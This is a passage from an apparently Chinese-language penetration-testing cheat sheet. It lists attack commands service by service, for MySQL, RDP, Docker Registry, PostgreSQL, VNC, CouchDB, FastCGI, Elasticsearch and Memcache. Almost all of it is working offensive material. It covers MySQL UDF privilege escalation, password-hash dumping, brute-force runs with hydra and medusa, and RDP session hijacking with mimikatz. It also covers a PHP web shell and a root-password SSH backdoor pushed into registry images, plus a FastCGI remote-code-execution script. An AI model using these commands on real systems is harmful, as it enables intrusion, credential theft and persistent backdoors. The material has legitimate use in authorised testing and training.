class="line"></span><br><span class="line">mysql&gt; \! cat /etc/passwd</span><br><span class="line">mysql&gt; \! bash</span><br></pre></td></tr></table></figure>
<h4 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># locate lib_mysqludf_sys.so</span><br><span class="line"></span><br><span class="line">use mysql;</span><br><span class="line">create table npn(line blob);</span><br><span class="line">insert into npn values(load_file(&#x27;/tmp/lib_mysqludf_sys.so&#x27;));</span><br><span class="line">select * from npn into dumpfile &#x27;/usr/lib/mysql/plugin/lib_mysqludf_sys.so&#x27;;</span><br><span class="line">create function sys_exec returns integer soname &#x27;lib_mysqludf_sys.so&#x27;;</span><br><span class="line">select sys_exec(&#x27;id &gt; /tmp/out.txt&#x27;);</span><br></pre></td></tr></table></figure>
<h4 id="凭证获取"><a href="#凭证获取" class="headerlink" title="凭证获取"></a>凭证获取</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT User,Host,Password FROM mysql.user;</span><br><span class="line">SELECT User,Host,authentication_string FROM mysql.user;</span><br><span class="line"></span><br><span class="line">mysql -u root --password=&lt;PASSWORD&gt; -e &quot;SELECT User,Host,authentication_string FROM mysql.user;&quot;</span><br></pre></td></tr></table></figure>
<h4 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse &#123;IP&#125; -p 3306</span><br><span class="line"></span><br><span class="line">msfconsole -q -x &#x27;use auxiliary/scanner/mysql/mysql_version; set RHOSTS &#123;IP&#125;; set RPORT 3306; run; exit&#x27; &amp;&amp; msfconsole -q -x &#x27;use auxiliary/scanner/mysql/mysql_authbypass_hashdump; set RHOSTS &#123;IP&#125;; set RPORT 3306; run; exit&#x27; &amp;&amp; msfconsole -q -x &#x27;use auxiliary/admin/mysql/mysql_enum; set RHOSTS &#123;IP&#125;; set RPORT 3306; run; exit&#x27; &amp;&amp; msfconsole -q -x &#x27;use auxiliary/scanner/mysql/mysql_hashdump; set RHOSTS &#123;IP&#125;; set RPORT 3306; run; exit&#x27; &amp;&amp; msfconsole -q -x &#x27;use auxiliary/scanner/mysql/mysql_schemadump; set RHOSTS &#123;IP&#125;; set RPORT 3306; run; exit&#x27;</span><br></pre></td></tr></table></figure>
<p>refer: </p>
<ul>
<li><a href="https://github.com/carlospolop/legion">https://github.com/carlospolop/legion</a></li>
<li><a href="https://book.hacktricks.xyz/pentesting/pentesting-mysql">https://book.hacktricks.xyz/pentesting/pentesting-mysql</a></li>
<li><a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></li>
</ul>
<h3 id="3389-RDP"><a href="#3389-RDP" class="headerlink" title="3389-RDP"></a>3389-RDP</h3><h4 id="服务指纹-4"><a href="#服务指纹-4" class="headerlink" title="服务指纹"></a>服务指纹</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE</span><br><span class="line">3389/tcp open  ms-wbt-server</span><br></pre></td></tr></table></figure>
<h4 id="登录连接-1"><a href="#登录连接-1" class="headerlink" title="登录连接"></a>登录连接</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rdesktop -u &lt;username&gt; &lt;IP&gt;</span><br><span class="line">rdesktop -d &lt;domain&gt; -u &lt;username&gt; -p &lt;password&gt; &lt;IP&gt;</span><br><span class="line">xfreerdp /u:[domain\]&lt;username&gt; /p:&lt;password&gt; /v:&lt;IP&gt;</span><br><span class="line">xfreerdp /u:[domain\]&lt;username&gt; /pth:&lt;hash&gt; /v:&lt;IP&gt;</span><br></pre></td></tr></table></figure>
<h4 id="暴力破解-10"><a href="#暴力破解-10" class="headerlink" title="暴力破解"></a>暴力破解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ncrack -vv --user &lt;User&gt; -P pwds.txt rdp://&lt;IP&gt;</span><br><span class="line">hydra -V -f -L &lt;userslist&gt; -P &lt;passwlist&gt; rdp://&lt;IP&gt;</span><br></pre></td></tr></table></figure>
<h4 id="服务枚举-6"><a href="#服务枚举-6" class="headerlink" title="服务枚举"></a>服务枚举</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --script &quot;rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info&quot; -p 3389 -T4 &lt;IP&gt;</span><br></pre></td></tr></table></figure>
<h4 id="会话窃取"><a href="#会话窃取" class="headerlink" title="会话窃取"></a>会话窃取</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）获取打开的会话</span><br><span class="line">query user</span><br><span class="line"></span><br><span class="line">2）访问所选会话</span><br><span class="line">tscon &lt;ID&gt; /dest:&lt;SESSIONNAME&gt;</span><br><span class="line"></span><br><span class="line">3）Mimikatz</span><br><span class="line">ts::sessions        #Get sessions</span><br><span class="line">ts::remote /id:2    #Connect to the session</span><br></pre></td></tr></table></figure>
<p>refer:</p>
<ul>
<li><a href="https://book.hacktricks.xyz/pentesting/pentesting-rdp">https://book.hacktricks.xyz/pentesting/pentesting-rdp</a></li>
<li><a href="https://github.com/JoelGMSec/AutoRDPwn">https://github.com/JoelGMSec/AutoRDPwn</a></li>
<li><a href="https://github.com/linuz/Sticky-Keys-Slayer">https://github.com/linuz/Sticky-Keys-Slayer</a></li>
</ul>
<h3 id="3690-svn"><a href="#3690-svn" class="headerlink" title="3690-svn"></a>3690-svn</h3><h4 id="服务信息"><a href="#服务信息" class="headerlink" title="服务信息"></a>服务信息</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE</span><br><span class="line">3690/tcp open  svnserve Subversion</span><br></pre></td></tr></table></figure>
<h4 id="Banner抓取-4"><a href="#Banner抓取-4" class="headerlink" title="Banner抓取"></a>Banner抓取</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -vn &#123;host&#125; 3690</span><br></pre></td></tr></table></figure>
<h4 id="服务枚举-7"><a href="#服务枚举-7" class="headerlink" title="服务枚举"></a>服务枚举</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svn ls svn://10.10.10.203 #list</span><br><span class="line">svn log svn://10.10.10.203 #Commit history</span><br><span class="line">svn checkout svn://10.10.10.203 #Download the repository</span><br><span class="line">svn up -r 2 #Go to revision 2 inside the checkout folder</span><br></pre></td></tr></table></figure>
<h3 id="5000-Docker-Registry"><a href="#5000-Docker-Registry" class="headerlink" title="5000-Docker Registry"></a>5000-Docker Registry</h3><h4 id="服务枚举-8"><a href="#服务枚举-8" class="headerlink" title="服务枚举"></a>服务枚举</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#List repositories</span><br><span class="line">curl -s http://10.10.10.10:5000/v2/_catalog</span><br><span class="line">&#123;&quot;repositories&quot;:[&quot;alpine&quot;,&quot;ubuntu&quot;]&#125;</span><br><span class="line"></span><br><span class="line">#Get tags of a repository</span><br><span class="line">curl -s http://192.251.36.3:5000/v2/ubuntu/tags/list</span><br><span class="line">&#123;&quot;name&quot;:&quot;ubuntu&quot;,&quot;tags&quot;:[&quot;14.04&quot;,&quot;12.04&quot;,&quot;18.04&quot;,&quot;16.04&quot;]&#125;</span><br><span class="line"></span><br><span class="line">#Get manifests</span><br><span class="line">curl -s http://192.251.36.3:5000/v2/ubuntu/manifests/latest</span><br><span class="line"></span><br><span class="line">#Download one of the previously listed blobs</span><br><span class="line">curl http://10.10.10.10:5000/v2/ubuntu/blobs/sha256:2a62ecb2a3e5bcdbac8b6edc58fae093a39381e05d08ca75ed27cae94125f935 --output blob1.tar</span><br><span class="line"></span><br><span class="line">#Inspect the insides of each blob</span><br><span class="line">tar -xf blob1.tar  #After this,inspect the new folders and files created in the current directory</span><br></pre></td></tr></table></figure>
<h4 id="Docker枚举"><a href="#Docker枚举" class="headerlink" title="Docker枚举"></a>Docker枚举</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#Once you know which images the server is saving (/v2/_catalog) you can pull them</span><br><span class="line">docker pull ip:5000/ubuntu</span><br><span class="line"></span><br><span class="line">#Check the commands used to create the layers of the image</span><br><span class="line">docker history IP:5000/ubuntu</span><br><span class="line"></span><br><span class="line">#Run and get a shell</span><br><span class="line">docker run -it IP:5000/ubuntu bash  #Leave this shell running</span><br><span class="line">docker ps   #Using a different shell</span><br><span class="line">docker exec -it 7d3a81fe42d7 bash  #Get ash shell inside docker container</span><br></pre></td></tr></table></figure>
<h4 id="暴力破解-11"><a href="#暴力破解-11" class="headerlink" title="暴力破解"></a>暴力破解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">curl -k -u username:password https://ip:5000/v2/_catalog</span><br></pre></td></tr></table></figure>
<h4 id="Web后门"><a href="#Web后门" class="headerlink" title="Web后门"></a>Web后门</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）创建后门：shell.php</span><br><span class="line"></span><br><span class="line">&lt;?php echo shell_exec($_GET[&quot;cmd&quot;]); ?&gt;</span><br><span class="line"></span><br><span class="line">2) 创建Dockerfile</span><br><span class="line"></span><br><span class="line">FROM IP:5000/wordpress</span><br><span class="line">COPY shell.php /app/</span><br><span class="line">RUN chmod 777 /app/shell.php</span><br><span class="line"></span><br><span class="line">3) 创建镜像然后push</span><br><span class="line"></span><br><span class="line">docker build -t IP:5000/wordpress .</span><br><span class="line">docker images</span><br><span class="line">docker push registry:5000/wordpress</span><br></pre></td></tr></table></figure>
<h4 id="SSH镜像后门"><a href="#SSH镜像后门" class="headerlink" title="SSH镜像后门"></a>SSH镜像后门</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 如果通过Docker Registry发现SSH镜像，可设置后门</span><br><span class="line"></span><br><span class="line">docker pull 10.10.10.10:5000/sshd-docker-cli</span><br><span class="line">docker run -d 10.10.10.10:5000/sshd-docker-cli</span><br><span class="line"></span><br><span class="line">2) 从SSH镜像提取sshd_config</span><br><span class="line"></span><br><span class="line">docker cp 4c989242c714:/etc/ssh/sshd_config .</span><br><span class="line"></span><br><span class="line">将其修改为：PermitRootLogin yes</span><br><span class="line"></span><br><span class="line">3) 创建Dockerfile</span><br><span class="line"></span><br><span class="line">FROM 10.10.10.10:5000/sshd-docker-cli</span><br><span class="line">COPY sshd_config /etc/ssh/</span><br><span class="line">RUN echo root:password | chpasswd</span><br><span class="line"></span><br><span class="line">4) 创建镜像然后push</span><br><span class="line"></span><br><span class="line">docker build -t 10.10.10.10:5000/sshd-docker-cli .</span><br><span class="line">docker images</span><br><span class="line">docker push registry:5000/sshd-docker-cli #Push it</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>refer:</p>
<ul>
<li><a href="https://book.hacktricks.xyz/pentesting/5000-pentesting-docker-registry">https://book.hacktricks.xyz/pentesting/5000-pentesting-docker-registry</a></li>
<li><a href="https://github.com/Syzik/DockerRegistryGrabber">https://github.com/Syzik/DockerRegistryGrabber</a></li>
</ul>
<h3 id="5432-5433-Postgresql"><a href="#5432-5433-Postgresql" class="headerlink" title="5432-5433: Postgresql"></a>5432-5433: Postgresql</h3><h4 id="服务指纹-5"><a href="#服务指纹-5" class="headerlink" title="服务指纹"></a>服务指纹</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE</span><br><span class="line">5432/tcp open  pgsql</span><br></pre></td></tr></table></figure>
<h4 id="连接命令"><a href="#连接命令" class="headerlink" title="连接命令"></a>连接命令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">psql -U &lt;myuser&gt;   # Open psql console with user</span><br><span class="line">psql -h &lt;host&gt; -U &lt;username&gt; -d &lt;database&gt;   # Remote connection</span><br><span class="line">psql -h &lt;host&gt; -p &lt;port&gt; -U &lt;username&gt; -W &lt;password&gt; &lt;database&gt;   # Remote connection</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">psql -h localhost -d &lt;database_name&gt; -U &lt;User&gt; #Password will be prompted</span><br><span class="line">\list # List databases</span><br><span class="line">\c &lt;database&gt; # use the database</span><br><span class="line">\d # List tables</span><br><span class="line">\du+ # Get users roles</span><br><span class="line"></span><br><span class="line">#Read a file</span><br><span class="line">CREATE TABLE demo(t text);</span><br><span class="line">COPY demo from &#x27;[FILENAME]&#x27;;</span><br><span class="line">SELECT * FROM demo;</span><br><span class="line"></span><br><span class="line">#Write ascii to a file (copy to cannot copy binary data)</span><br><span class="line">COPY (select convert_from(decode(&#x27;&lt;B64 payload&gt;&#x27;,&#x27;base64&#x27;),&#x27;utf-8&#x27;)) to &#x27;C:\\some\\interesting\path.cmd&#x27;; </span><br><span class="line"></span><br><span class="line">#List databases</span><br><span class="line">SELECT datname FROM pg_database;</span><br><span class="line"></span><br><span class="line">#Read credentials (usernames + pwd hash)</span><br><span class="line">SELECT usename, passwd from pg_shadow;</span><br><span class="line"></span><br><span class="line">#Check if current user is superiser</span><br><span class="line">SELECT current_setting(&#x27;is_superuser&#x27;);   #If response is &quot;on&quot; then true, if &quot;off&quot; then false</span><br><span class="line"></span><br><span class="line">#Check if plpgsql is enabled</span><br><span class="line">SELECT lanname,lanacl FROM pg_language WHERE lanname = &#x27;plpgsql&#x27;</span><br><span class="line"></span><br><span class="line">#Change password</span><br><span class="line">ALTER USER user_name WITH PASSWORD &#x27;new_password&#x27;;</span><br><span class="line"></span><br><span class="line">#Check users privileges over a table (pg_shadow on this example)</span><br><span class="line">SELECT grantee, privilege_type </span><br><span class="line">FROM information_schema.role_table_grants </span><br><span class="line">WHERE table_name=&#x27;pg_shadow&#x27;</span><br><span class="line"></span><br><span class="line">#Get users roles</span><br><span class="line">SELECT </span><br><span class="line">      r.rolname, </span><br><span class="line">      r.rolsuper, </span><br><span class="line">      r.rolinherit,</span><br><span class="line">      r.rolcreaterole,</span><br><span class="line">      r.rolcreatedb,</span><br><span class="line">      r.rolcanlogin,</span><br><span class="line">      r.rolconnlimit, r.rolvaliduntil,</span><br><span class="line">  ARRAY(SELECT b.rolname</span><br><span class="line">        FROM pg_catalog.pg_auth_members m</span><br><span class="line">        JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)</span><br><span class="line">        WHERE m.member = r.oid) as memberof</span><br><span class="line">, r.rolreplication</span><br><span class="line">FROM pg_catalog.pg_roles r</span><br><span class="line">ORDER BY 1;</span><br></pre></td></tr></table></figure>
<h4 id="服务枚举-9"><a href="#服务枚举-9" class="headerlink" title="服务枚举"></a>服务枚举</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/postgres/postgres_version</span><br><span class="line">msf&gt; use auxiliary/scanner/postgres/postgres_dbname_flag_injection</span><br></pre></td></tr></table></figure>
<h4 id="暴力破解-12"><a href="#暴力破解-12" class="headerlink" title="暴力破解"></a>暴力破解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt &lt;IP&gt; postgres</span><br><span class="line">medusa -h &lt;IP&gt; –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres</span><br><span class="line">ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt &lt;IP&gt;:5432</span><br><span class="line">patator pgsql_login host=&lt;IP&gt; user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt</span><br><span class="line">use auxiliary/scanner/postgres/postgres_login</span><br><span class="line">nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 &lt;IP&gt;</span><br></pre></td></tr></table></figure>
<h4 id="攻击利用-3"><a href="#攻击利用-3" class="headerlink" title="攻击利用"></a>攻击利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/postgres/postgres_hashdump</span><br><span class="line">msf&gt; use auxiliary/scanner/postgres/postgres_schemadump</span><br><span class="line">msf&gt; use auxiliary/admin/postgres/postgres_readfile</span><br><span class="line">msf&gt; use exploit/linux/postgres/postgres_payload</span><br><span class="line">msf&gt; use exploit/windows/postgres/postgres_payload</span><br></pre></td></tr></table></figure>
<p>refer:</p>
<ul>
<li><a href="https://book.hacktricks.xyz/pentesting/pentesting-postgresql">https://book.hacktricks.xyz/pentesting/pentesting-postgresql</a></li>
</ul>
<h3 id="5800-x2F-5801-x2F-5900-x2F-5901-VNC"><a href="#5800-x2F-5801-x2F-5900-x2F-5901-VNC" class="headerlink" title="5800&#x2F;5801&#x2F;5900&#x2F;5901-VNC"></a>5800&#x2F;5801&#x2F;5900&#x2F;5901-VNC</h3><h4 id="服务枚举-10"><a href="#服务枚举-10" class="headerlink" title="服务枚举"></a>服务枚举</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p &lt;PORT&gt; &lt;IP&gt;</span><br><span class="line">msf&gt; use auxiliary/scanner/vnc/vnc_none_auth</span><br></pre></td></tr></table></figure>
<h4 id="暴力破解-13"><a href="#暴力破解-13" class="headerlink" title="暴力破解"></a>暴力破解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s &lt;PORT&gt; &lt;IP&gt; vnc</span><br><span class="line">medusa -h &lt;IP&gt; –u root -P /root/Desktop/pass.txt –M vnc</span><br><span class="line">ncrack -V --user root -P /root/Desktop/pass.txt &lt;IP&gt;:&gt;POR&gt;T</span><br><span class="line">patator vnc_login host=&lt;IP&gt; password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!=&#x27;Authentication failure&#x27; --max-retries 0 –x quit:code=0use auxiliary/scanner/vnc/vnc_login</span><br><span class="line">nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 &lt;IP&gt;</span><br><span class="line"></span><br><span class="line">#Metasploit</span><br><span class="line">use auxiliary/scanner/vnc/vnc_login</span><br><span class="line">set RHOSTS &lt;ip&gt;</span><br><span class="line">set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst</span><br></pre></td></tr></table></figure>
<h4 id="VNC连接"><a href="#VNC连接" class="headerlink" title="VNC连接"></a>VNC连接</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vncviewer [-passwd passwd.txt] &lt;IP&gt;::5901</span><br></pre></td></tr></table></figure>
<h4 id="VNC解密"><a href="#VNC解密" class="headerlink" title="VNC解密"></a>VNC解密</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">默认密码存储位置: ~/.vnc/passwd</span><br><span class="line"></span><br><span class="line"># 解密：https://github.com/jeroennijhof/vncpwd</span><br><span class="line"></span><br><span class="line">make</span><br><span class="line">vncpwd &lt;vnc password file&gt;</span><br></pre></td></tr></table></figure>
<p>refer:</p>
<ul>
<li><a href="https://book.hacktricks.xyz/pentesting/pentesting-vnc">https://book.hacktricks.xyz/pentesting/pentesting-vnc</a></li>
</ul>
<h3 id="5984-x2F-6984-CouchDB"><a href="#5984-x2F-6984-CouchDB" class="headerlink" title="5984&#x2F;6984-CouchDB"></a>5984&#x2F;6984-CouchDB</h3><h4 id="自动枚举"><a href="#自动枚举" class="headerlink" title="自动枚举"></a>自动枚举</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV --script couchdb-databases,couchdb-stats -p &lt;PORT&gt; &lt;IP&gt;</span><br><span class="line">msf&gt; use auxiliary/scanner/couchdb/couchdb_enum</span><br></pre></td></tr></table></figure>
<h4 id="手工枚举"><a href="#手工枚举" class="headerlink" title="手工枚举"></a>手工枚举</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）Banner获取</span><br><span class="line">curl http://IP:5984/</span><br><span class="line"></span><br><span class="line">2）Database List</span><br><span class="line">curl -X GET http://IP:5984/_all_dbs</span><br><span class="line">curl -X GET http://user:password@IP:5984/_all_dbs</span><br><span class="line"></span><br><span class="line">3）Database Info</span><br><span class="line">curl http://IP:5984/&lt;database&gt;</span><br><span class="line">curl http://localhost:5984/simpsons</span><br><span class="line"></span><br><span class="line">4）Document List</span><br><span class="line">curl -X GET http://IP:5984/&#123;dbname&#125;/_all_docs</span><br><span class="line">curl http://localhost:5984/simpsons/_all_docs</span><br><span class="line"></span><br><span class="line">5）Read Document</span><br><span class="line">curl -X GET http://IP:5984/&#123;dbname&#125;/&#123;id&#125;</span><br><span class="line">curl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9</span><br></pre></td></tr></table></figure>
<h4 id="暴力破解-14"><a href="#暴力破解-14" class="headerlink" title="暴力破解"></a>暴力破解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/couchdb/couchdb_login</span><br><span class="line">hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /</span><br></pre></td></tr></table></figure>
<p>refer:</p>
<ul>
<li><a href="https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html">https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html</a></li>
<li><a href="https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution">https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution</a></li>
<li><a href="https://book.hacktricks.xyz/pentesting/5984-pentesting-couchdb">https://book.hacktricks.xyz/pentesting/5984-pentesting-couchdb</a></li>
</ul>
<h3 id="8009-AJP"><a href="#8009-AJP" class="headerlink" title="8009-AJP"></a>8009-AJP</h3><h4 id="服务指纹-6"><a href="#服务指纹-6" class="headerlink" title="服务指纹"></a>服务指纹</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE</span><br><span class="line">8009/tcp open  ajp13</span><br></pre></td></tr></table></figure>
<h4 id="服务枚举-11"><a href="#服务枚举-11" class="headerlink" title="服务枚举"></a>服务枚举</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 &lt;IP&gt;</span><br></pre></td></tr></table></figure>
<h4 id="暴力破解-15"><a href="#暴力破解-15" class="headerlink" title="暴力破解"></a>暴力破解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --script ajp-brute -p 8009 &lt;IP&gt;</span><br></pre></td></tr></table></figure>
<h3 id="8086-InfluxDB"><a href="#8086-InfluxDB" class="headerlink" title="8086-InfluxDB"></a>8086-InfluxDB</h3><h4 id="认证枚举"><a href="#认证枚举" class="headerlink" title="认证枚举"></a>认证枚举</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）无认证</span><br><span class="line">influx -host &#x27;host name&#x27; -port &#x27;port #&#x27;</span><br><span class="line">&gt; use _internal</span><br><span class="line"></span><br><span class="line">2）有认证</span><br><span class="line">influx –username influx –password influx_pass</span><br><span class="line"></span><br><span class="line">3）自动化枚举</span><br><span class="line">msf6 &gt; use auxiliary/scanner/http/influxdb_enum</span><br></pre></td></tr></table></figure>
<h4 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; show databases</span><br><span class="line"></span><br><span class="line">&gt; show measurements  #显示SQL表</span><br><span class="line"></span><br><span class="line">&gt; show field keys    #显示字段键值：列</span><br><span class="line"></span><br><span class="line">&gt; select * from cpu  #dump the table</span><br></pre></td></tr></table></figure>
<h3 id="9000-FastCGI"><a href="#9000-FastCGI" class="headerlink" title="9000-FastCGI"></a>9000-FastCGI</h3><h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">PAYLOAD=&quot;&lt;?php echo &#x27;&lt;!--&#x27;; system(&#x27;whoami&#x27;); echo &#x27;--&gt;&#x27;;&quot;</span><br><span class="line">FILENAMES=&quot;/var/www/public/index.php&quot; # Exisiting file path</span><br><span class="line"></span><br><span class="line">HOST=$1</span><br><span class="line">B64=$(echo &quot;$PAYLOAD&quot;|base64)</span><br><span class="line"></span><br><span class="line">for FN in $FILENAMES; do</span><br><span class="line">    OUTPUT=$(mktemp)</span><br><span class="line">    env -i \</span><br><span class="line">      PHP_VALUE=&quot;allow_url_include=1&quot;$&#x27;\n&#x27;&quot;allow_url_fopen=1&quot;$&#x27;\n&#x27;&quot;auto_prepend_file=&#x27;data://text/plain\;base64,$B64&#x27;&quot; \</span><br><span class="line">      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \</span><br><span class="line">      cgi-fcgi -bind -connect $HOST:9000 &amp;&gt; $OUTPUT</span><br><span class="line"></span><br><span class="line">    cat $OUTPUT</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<p>refer:</p>
<ul>
<li><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></li>
<li><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-fpm-fastcgi">https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass&#x2F;disable_functions-bypass-php-fpm-fastcgi</a></li>
</ul>
<h3 id="9200-x2F-9300-Elasticsearch"><a href="#9200-x2F-9300-Elasticsearch" class="headerlink" title="9200&#x2F;9300: Elasticsearch"></a>9200&#x2F;9300: Elasticsearch</h3><h4 id="认证验证"><a href="#认证验证" class="headerlink" title="认证验证"></a>认证验证</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X GET &quot;ELASTICSEARCH-SERVER:9200/_xpack/security/user&quot;  #无认证</span><br><span class="line"></span><br><span class="line">curl -X GET http://user:password@IP:9200/  #有认证</span><br></pre></td></tr></table></figure>
<h4 id="暴力破解-16"><a href="#暴力破解-16" class="headerlink" title="暴力破解"></a>暴力破解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /</span><br></pre></td></tr></table></figure>
<h4 id="用户枚举"><a href="#用户枚举" class="headerlink" title="用户枚举"></a>用户枚举</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#List all roles on the system:</span><br><span class="line">curl -X GET &quot;ELASTICSEARCH-SERVER:9200/_security/role&quot;</span><br><span class="line"></span><br><span class="line">#List all users on the system:</span><br><span class="line">curl -X GET &quot;ELASTICSEARCH-SERVER:9200/_security/user&quot;</span><br><span class="line"></span><br><span class="line">#Get more information about the rights of an user:</span><br><span class="line">curl -X GET &quot;ELASTICSEARCH-SERVER:9200/_security/user/&lt;USERNAME&gt;&quot;</span><br><span class="line"></span><br><span class="line">msf &gt; use auxiliary/scanner/elasticsearch/indices_enum</span><br></pre></td></tr></table></figure>
<p>refer:</p>
<ul>
<li><a href="https://book.hacktricks.xyz/pentesting/9200-pentesting-elasticsearch">https://book.hacktricks.xyz/pentesting/9200-pentesting-elasticsearch</a></li>
</ul>
<h3 id="11211-Memcache"><a href="#11211-Memcache" class="headerlink" title="11211-Memcache"></a>11211-Memcache</h3><h4 id="服务枚举-12"><a href="#服务枚举-12" class="headerlink" title="服务枚举"></a>服务枚举</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;version&quot; | nc -vn -w 1 &lt;IP&gt; 11211      #Get version</span><br><span class="line">echo &quot;stats&quot; | nc -vn -w 1 &lt;IP&gt; 11211        #Get status</span><br><span class="line">echo &quot;stats slabs&quot; | nc -vn -w 1 &lt;IP&gt; 11211  #Get slabs</span><br><span class="line">echo &quot;stats items&quot; | nc -vn -w 1 &lt;IP&gt; 11211  #Get items of slabs with info</span><br><span class="line">echo &quot;stats cachedump &lt;number&gt; 0&quot; | nc -vn -w 1 &lt;IP&gt; 11211  #Get key names (the 0 is for unlimited output size)</span><br><span class="line">echo &quot;get &lt;item_name&gt;&quot; | nc -vn -w 1 &lt;IP&gt; 11211  #Get saved info</span><br><span class="line"></span><br><span class="line">#This php will just dump the keys, you need to use &quot;get &lt;item_name&gt; later&quot;</span><br><span class="line">sudo apt-get install php-memcached</span><br><span class="line">php -r &#x27;$c = new Memcached(); $c-&gt;addServer(&quot;localhost&quot;, 11211); var_dump( $c-&gt;getAllKeys() );&#x27;</span><br></pre></td></tr></table></figure>
<h4 id="工具枚举"><a href="#工具枚举" class="headerlink" title="工具枚举"></a>工具枚举</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install libmemcached-tools</span><br><span class="line">memcstat --servers=127.0.0.1 #Get stats</span><br><span class="line">memcdump --servers=127.0.0.1 #Get all items</span><br><span class="line">memccat  --servers=127.0.0.1 &lt;item1&gt; &lt;item2&gt; &lt;item3&gt; #Get info inside the item(s)</span><br></pre></td></tr></table></figure>
